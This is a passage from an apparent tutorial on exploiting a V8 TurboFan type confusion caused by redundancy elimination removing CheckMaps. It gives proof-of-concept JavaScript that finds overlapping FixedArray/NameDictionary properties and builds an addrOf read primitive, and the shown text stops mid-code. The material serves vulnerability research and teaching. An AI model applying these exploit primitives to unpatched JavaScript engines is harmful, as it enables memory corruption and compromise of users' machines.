&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;C:\dev\v8\v8\out\x64.debug&amp;gt;d8 --allow-natives-syntax --trace-turbo poc.js
Concurrent recompilation has been disabled &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; tracing.
---------------------------------------------------
Begin compiling method vuln &lt;span class=&#34;hljs-keyword&#34;&gt;using&lt;/span&gt; Turbofan
---------------------------------------------------
Finished compiling method vuln &lt;span class=&#34;hljs-keyword&#34;&gt;using&lt;/span&gt; Turbofan&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;image%204.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;You can see that redundancy elimination removed the &lt;code&gt;CheckMaps&lt;/code&gt; at node 46 on the left. At that point, when execution passes through &lt;code&gt;JSCreateObject&lt;/code&gt; at node 28, a map transition can occur &amp;#x2014; and that is where Type Confusion can be triggered.&lt;/p&gt;
&lt;h3 id=&#34;Five-Steps-to-generate-a-Proof-of-Concept&#34;&gt;&lt;a href=&#34;#Five-Steps-to-generate-a-Proof-of-Concept&#34; class=&#34;headerlink&#34; title=&#34;Five Steps to generate a Proof of Concept&#34;&gt;&lt;/a&gt;Five Steps to generate a Proof of Concept&lt;/h3&gt;&lt;p&gt;After triggering the Type Confusion as described above, the exploit uses the side effect that occurs when accessing the object. The access phase can be divided into five steps.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create the prototype object: make a new object with in-object (inline) properties. This object will be used as the prototype for &lt;code&gt;Object.create&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Add an out-of-line property: add a property to the object&amp;#x2019;s property backing store. This property will be accessed after the Map transition.&lt;/li&gt;
&lt;li&gt;Force &lt;code&gt;CheckMap&lt;/code&gt; execution: run the &lt;code&gt;CheckMap&lt;/code&gt; operation to encourage redundancy elimination. This causes later &lt;code&gt;CheckMap&lt;/code&gt; operations to be removed.&lt;/li&gt;
&lt;li&gt;Induce a Map transition: call &lt;code&gt;Object.create&lt;/code&gt; using the object created earlier. This changes the object&amp;#x2019;s structure and transitions it to a new hidden class (Map).&lt;/li&gt;
&lt;li&gt;Access the out-of-line property: finally, access the out-of-line property.&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;In-object properties (Inline properties)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Inline properties are stored directly in the object&amp;#x2019;s memory. Because no extra memory indirection is required when accessing them, they&amp;#x2019;re the fastest and most efficient storage. V8 uses the object&amp;#x2019;s Map (hidden class) to compute the precise offset of each inline property.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Out-of-line properties (Out-of-line / backing store properties)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;When an object has more properties than fit in its inline property slots, the remaining properties are stored out-of-line in a separate backing store (property backing store). Accessing these properties requires an extra level of indirection compared to inline properties.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Speculation Guard&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;CheckMap&lt;/code&gt; is an operation that verifies an object&amp;#x2019;s hidden class matches the expected one; it serves as a speculation guard. The JIT compiler analyzes runtime patterns and speculates that a variable&amp;#x2019;s type will remain constant, then generates optimized code based on that assumption. &lt;code&gt;CheckMap&lt;/code&gt; confirms whether that speculation still holds.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Words alone may be unclear, so let&amp;#x2019;s inspect the code in the next section.&lt;/p&gt;
&lt;h2 id=&#34;2-3-Exploiting-a-Type-Confusion&#34;&gt;&lt;a href=&#34;#2-3-Exploiting-a-Type-Confusion&#34; class=&#34;headerlink&#34; title=&#34;2.3 Exploiting a Type Confusion&#34;&gt;&lt;/a&gt;2.3 &lt;strong&gt;Exploiting a Type Confusion&lt;/strong&gt;&lt;/h2&gt;&lt;h3 id=&#34;Map-Transition&#34;&gt;&lt;a href=&#34;#Map-Transition&#34; class=&#34;headerlink&#34; title=&#34;Map Transition&#34;&gt;&lt;/a&gt;Map Transition&lt;/h3&gt;&lt;p&gt;In section 2.2 we used &lt;code&gt;%OptimizeFunctionOnNextCall&lt;/code&gt;, which lets a developer force optimization timing. Instead, we&amp;#x2019;ll let V8 decide when to optimize by making the function hot through repeated calls. As we&amp;#x2019;ve seen, ordinary JavaScript goes through V8&amp;#x2019;s optimization pipeline: when V8 deems a function &amp;#x201C;hot,&amp;#x201D; it uses the JIT compilers (Maglev, TurboFan) to generate optimized native code for it.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;vuln&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(obj)&lt;/span&gt; &lt;/span&gt;{
  &lt;span class=&#34;hljs-comment&#34;&gt;// Access Property a of obj, forcing a CheckMap operation&lt;/span&gt;
  obj.a;

  &lt;span class=&#34;hljs-comment&#34;&gt;// Force a Map Transition via our side-effect&lt;/span&gt;
  Object.create(obj)

  &lt;span class=&#34;hljs-comment&#34;&gt;// Trigger our type-confusion by accessing an out-of-bound property&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; obj.b;
}

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
  let obj = {a:&lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;}; &lt;span class=&#34;hljs-comment&#34;&gt;// Create object with in-line properties&lt;/span&gt;
  obj.b = &lt;span class=&#34;hljs-number&#34;&gt;43&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;// Store property out-of-line in backing store&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) { %DebugPrint(obj); }
  vuln(obj); &lt;span class=&#34;hljs-comment&#34;&gt;// Trigger type-confusion&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (i = &lt;span class=&#34;hljs-number&#34;&gt;9999&lt;/span&gt;) { %DebugPrint(obj); }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Save the above code to a JSON file and run it with &lt;code&gt;d8&lt;/code&gt;; you&amp;#x2019;ll get results like the screenshot below.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%205.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The object&amp;#x2019;s Map (which holds its layout) changed from &lt;code&gt;FastProperties&lt;/code&gt; to &lt;code&gt;DictionaryProperties&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;(The bottom of the image is slightly cut off,) but you can also see that the property backing store transitioned from a &lt;code&gt;FixedArray&lt;/code&gt; to a &lt;code&gt;NameDictionary&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;V8 stores an object&amp;#x2019;s excess properties (those that overflow inline slots) in a separate memory area called the property backing store. This backing store is implemented as a &lt;strong&gt;FixedArray&lt;/strong&gt; called &lt;strong&gt;PropertyArray&lt;/strong&gt;. Thus, the &lt;strong&gt;PropertyArray&lt;/strong&gt; can be seen as a special-purpose &lt;strong&gt;FixedArray&lt;/strong&gt; used to hold an object&amp;#x2019;s out-of-line properties.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;FixedArray&lt;/code&gt; and &lt;code&gt;NameDictionary&lt;/code&gt; are composed as follows:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%206.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;FixedArray (PropertyArray) is a simple array structure with contiguous value slots. It stores an object&amp;#x2019;s out-of-line (those that exceed the inline slots) property &lt;strong&gt;values in order&lt;/strong&gt;. A simplified layout looks like:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs gherkin&#34;&gt;FixedArray:
[ header |&lt;span class=&#34;hljs-string&#34;&gt; slot0 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; slot1 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; slot2 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; slot3 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; ... ]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;NameDictionary stores (key, value, details) tuples in a hashtable/dictionary form. Because it must keep the property name, value, and property attributes (details) together, its structure is more complex. The per-process hash seed (randomness) is mixed in, so the placement of keys in the table changes on every run. In short, NameDictionary is a complicated hash-table structure whose property storage locations are randomized each execution, making them hard to predict. A simplified layout looks like:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs gherkin&#34;&gt;NameDictionary:
[ header |&lt;span class=&#34;hljs-string&#34;&gt; ... &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; key0 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; value0 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; details0 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; key1 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; value1 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt; details1 &lt;/span&gt;|&lt;span class=&#34;hljs-string&#34;&gt;...]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So &amp;#x2014; what side effects can happen if properties of different types get confused?&lt;/p&gt;
&lt;p&gt;When properties that used to be stored sequentially in a &lt;code&gt;FixedArray&lt;/code&gt; (&lt;code&gt;0&lt;/code&gt;, &lt;code&gt;1&lt;/code&gt;, &lt;code&gt;2&lt;/code&gt;, &amp;#x2026;) are converted to a &lt;code&gt;NameDictionary&lt;/code&gt;, they end up scattered at completely different memory offsets. The JIT-compiled code, however, was generated assuming the &lt;code&gt;FixedArray&lt;/code&gt; offsets. If execution continues using those fixed &lt;code&gt;FixedArray&lt;/code&gt; offsets while the backing store is actually a &lt;code&gt;NameDictionary&lt;/code&gt;, you end up accessing entirely different fields &amp;#x2014; sometimes those fields will accidentally line up so that a different property appears to be at the same offset. By triggering this situation you can gain an exploitable primitive.&lt;/p&gt;
&lt;p&gt;As shown above, hot code produced by repeating a pattern causes the JIT compiler to assume a fixed map and generate native code that accesses properties at fixed offsets. For example, &lt;code&gt;obj.p10&lt;/code&gt; may be compiled to read from &lt;code&gt;base + offset + 10*8&lt;/code&gt;. If that compiled code remains and you trigger a map transition at runtime, the object&amp;#x2019;s map can change from &lt;code&gt;FastProperties&lt;/code&gt; &amp;#x2192; &lt;code&gt;DictionaryProperties&lt;/code&gt;, swapping the backing store from a &lt;code&gt;FixedArray&lt;/code&gt; to a &lt;code&gt;NameDictionary&lt;/code&gt;. But the JIT code doesn&amp;#x2019;t know about the change and keeps reading at the fixed &lt;code&gt;FixedArray&lt;/code&gt; offsets. Because the two layouts place fields differently, &lt;strong&gt;the same read will end up reading some other field&lt;/strong&gt; in memory.&lt;/p&gt;
&lt;h3 id=&#34;Finding-Overlapping-Properties&#34;&gt;&lt;a href=&#34;#Finding-Overlapping-Properties&#34; class=&#34;headerlink&#34; title=&#34;Finding Overlapping Properties&#34;&gt;&lt;/a&gt;Finding Overlapping Properties&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Create object with one inline and 31 out-of-line properties&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;makeObj&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
    let obj = {&lt;span class=&#34;hljs-keyword&#34;&gt;inline&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;};
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        Object.defineProperty(obj, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i, {
            writable: &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;,
            value: -i
        });
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; obj;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;First, this creates an object with one inline property (&lt;code&gt;inline&lt;/code&gt;) and 31 out-of-line properties (&lt;code&gt;p1&lt;/code&gt; ~ &lt;code&gt;p31&lt;/code&gt;). We plant negative values in each out-of-line property so that, when we later dump memory, we can clearly identify only the values we inserted (they won&amp;#x2019;t be confused with small positive dictionary-internal values). The single inline access like &lt;code&gt;obj.inline&lt;/code&gt; exists so the JIT will generate a &lt;code&gt;CheckMap&lt;/code&gt; and form the assumption &amp;#x201C;this object has this map.&amp;#x201D; In other words, the &lt;code&gt;obj.inline&lt;/code&gt; access causes a &lt;strong&gt;map-check&lt;/strong&gt; inside &lt;code&gt;vuln()&lt;/code&gt;. After we cause the map transition, the JIT will keep using the old assumption and Type Confusion occurs.&lt;/p&gt;
&lt;p&gt;Let&amp;#x2019;s look at the full PoC that finds overlapping property pairs.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Create object with one inline and 31 out-of-line properties&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;makeObj&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
    let obj = {&lt;span class=&#34;hljs-keyword&#34;&gt;inline&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;};
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        Object.defineProperty(obj, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i, {
            writable: &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;,
            value: -i
        });
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; obj;
}

&lt;span class=&#34;hljs-comment&#34;&gt;// Find a pair of properties where p1 is stored at the same offset&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;// in the FixedArray as p2 is in the NameDictionary&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;findOverlappingProperties&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
    &lt;span class=&#34;hljs-comment&#34;&gt;// Create an array of all 32 property names such as p1..p32&lt;/span&gt;
    let pNames = [];
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        pNames[i] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i;
    }

    &lt;span class=&#34;hljs-comment&#34;&gt;// Create eval of our vuln function that will generate code during runtime&lt;/span&gt;
    eval(`
    function vuln(obj) {
      &lt;span class=&#34;hljs-comment&#34;&gt;// Access Property inline of obj, forcing a CheckMap operation&lt;/span&gt;
      obj.&lt;span class=&#34;hljs-keyword&#34;&gt;inline&lt;/span&gt;;
      &lt;span class=&#34;hljs-comment&#34;&gt;// Force a Map Transition via our side-effect&lt;/span&gt;
      &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.Object.create(obj);
      &lt;span class=&#34;hljs-comment&#34;&gt;// Trigger our type-confusion by accessing out-of-bound properties&lt;/span&gt;
      ${pNames.&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;((p) =&amp;gt; `let ${p} = obj.${p};`).join(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\n&amp;apos;&lt;/span&gt;)}
      return [${pNames.join(&amp;apos;, &amp;apos;)}];
    }
  `)

    &lt;span class=&#34;hljs-comment&#34;&gt;// JIT code to trigger vuln&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        let res = vuln(makeObj());
        &lt;span class=&#34;hljs-comment&#34;&gt;// Print FixedArray when i=1 and Dictionary when i=9999&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (i == &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; || i == &lt;span class=&#34;hljs-number&#34;&gt;9999&lt;/span&gt;) {
            print(res);
        }
    }
}

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Finding Overlapping Properties&amp;quot;&lt;/span&gt;);
findOverlappingProperties();&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The vulnerable &lt;code&gt;vuln()&lt;/code&gt; function dynamically generates code at runtime (using &lt;code&gt;eval&lt;/code&gt; and template literals) that reads &lt;code&gt;p1&lt;/code&gt;~&lt;code&gt;p31&lt;/code&gt; and returns them as an array. This avoids manually writing many read statements and forces the JIT to produce code that reads many properties at once; repeated execution triggers profiling and then optimization into code that uses fixed offsets.&lt;/p&gt;
&lt;p&gt;The search strategy is as follows: plant many candidate properties, run the function many times to make it hot so the JIT compiles it, then deliberately force a map transition and compare the read results before and after the transition. Indices where the results differ identify candidate overlapping locations.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%207.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Note: In &lt;code&gt;../v8&lt;/code&gt; (a recent checkout) you can verify that the bug is no longer reproducible.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;By running the same object shape thousands of times to drive JIT compilation, then intentionally causing the map transition and comparing reads in the FixedArray vs NameDictionary states, you can find where the negative values moved &amp;#x2014; those indices are candidates. From those candidates, discard trivial cases where &lt;code&gt;pX&lt;/code&gt; overlaps with itself; keep only pairs where different properties collide (&lt;code&gt;pA &amp;#x2194; pB&lt;/code&gt;) and verify they match. The code above is a full PoC that finds overlapping property pairs.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Function that creates an object with one in-line and 32 out-of-line properties&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;makeObj&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
    let obj = {&lt;span class=&#34;hljs-keyword&#34;&gt;inline&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;};
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        Object.defineProperty(obj, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i, {
            writable: &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;,
            value: -i
        });
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; obj;
}

&lt;span class=&#34;hljs-comment&#34;&gt;// Function that finds a pair of properties where p1 is stored at the same offset&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;// in the FixedArray as p2 in the NameDictionary&lt;/span&gt;
let p1, p2;

&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;findOverlappingProperties&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
    &lt;span class=&#34;hljs-comment&#34;&gt;// Create an array of all 32 property names such as p1..p32&lt;/span&gt;
    let pNames = [];
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        pNames[i] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i;
    }

    &lt;span class=&#34;hljs-comment&#34;&gt;// Create eval of our vuln function that will generate code during runtime&lt;/span&gt;
    eval(`
    function vuln(obj) {
      &lt;span class=&#34;hljs-comment&#34;&gt;// Access Property inline of obj, forcing a CheckMap operation&lt;/span&gt;
      obj.&lt;span class=&#34;hljs-keyword&#34;&gt;inline&lt;/span&gt;;
      &lt;span class=&#34;hljs-comment&#34;&gt;// Force a Map Transition via our side-effect&lt;/span&gt;
      &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.Object.create(obj);
      &lt;span class=&#34;hljs-comment&#34;&gt;// Trigger our type-confusion by accessing out-of-bound properties&lt;/span&gt;
      ${pNames.&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;((p) =&amp;gt; `let ${p} = obj.${p};`).join(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\n&amp;apos;&lt;/span&gt;)}
      return [${pNames.join(&amp;apos;, &amp;apos;)}];
    }
  `)

    &lt;span class=&#34;hljs-comment&#34;&gt;// JIT code to trigger vuln&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-comment&#34;&gt;// Create Object and pass it to Vuln function&lt;/span&gt;
        let res = vuln(makeObj());
        &lt;span class=&#34;hljs-comment&#34;&gt;// Look for overlapping properties in results&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; i &amp;lt; res.length; i++) {
            &lt;span class=&#34;hljs-comment&#34;&gt;// If i is not the same value, and res[i] is between -32 and 0, it overlaps&lt;/span&gt;
            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (i !== -res[i] &amp;amp;&amp;amp; res[i] &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; res[i] &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;-32&lt;/span&gt;) {
                [p1, p2] = [i, -res[i]];
                &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;
            }
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] Failed to find overlapping properties&amp;quot;&lt;/span&gt;;
}

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Finding Overlapping Properties...&amp;quot;&lt;/span&gt;);
findOverlappingProperties();
print(`[+] Properties p${p1} &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; p${p2} overlap!`);&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;image%208.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;As mentioned, NameDictionary&amp;#x2019;s property placement is randomized at runtime, so you must discover pairs dynamically like this. Now that we have such a pair, let&amp;#x2019;s see how to use it to get Read/Write primitives!&lt;/p&gt;
&lt;h3 id=&#34;The-addrOf-Read-Primitive&#34;&gt;&lt;a href=&#34;#The-addrOf-Read-Primitive&#34; class=&#34;headerlink&#34; title=&#34;The addrOf Read Primitive&#34;&gt;&lt;/a&gt;The addrOf Read Primitive&lt;/h3&gt;&lt;p&gt;Create an inline object that stores a &lt;code&gt;double&lt;/code&gt; and then create another object that will be stored in the backing store, then trigger the Type Confusion. The result is that an object pointer gets interpreted as a &lt;code&gt;double&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;addrOf&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-comment&#34;&gt;// 1. Dynamically generate vuln function (bypass Map check)&lt;/span&gt;
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // We expect p1 to be a Double, but actually p2 (an Object pointer) is loaded&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      return obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x; &lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;  `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; obj = {&lt;span class=&#34;hljs-attr&#34;&gt;z&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;}; &lt;span class=&#34;hljs-comment&#34;&gt;// the target object whose address we want&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    pValues[p1] = {&lt;span class=&#34;hljs-attr&#34;&gt;x&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;}; &lt;span class=&#34;hljs-comment&#34;&gt;// Double (expected type)&lt;/span&gt;
    pValues[p2] = {&lt;span class=&#34;hljs-attr&#34;&gt;y&lt;/span&gt;: obj}; &lt;span class=&#34;hljs-comment&#34;&gt;// Object (actually loaded value)&lt;/span&gt;

    &lt;span class=&#34;hljs-comment&#34;&gt;// 2. Drive JIT optimization and induce type confusion&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-comment&#34;&gt;// If the return value is not 13.37 (i.e., an address leaked), success&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res.toBigInt() - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;// return address and remove tag&lt;/span&gt;
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] AddrOf Primitive Failed&amp;quot;&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Below is the Read Primitive code that includes the function above (if you want the pointer untagging logic, replace with the function above).&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Function that creates an object with one in-line and 32 out-of-line properties&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;makeObj&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(pValues)&lt;/span&gt; &lt;/span&gt;{
    let obj = {&lt;span class=&#34;hljs-keyword&#34;&gt;inline&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;};
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        Object.defineProperty(obj, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i, {
            writable: &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;,
            value: pValues[i]
        });
    }
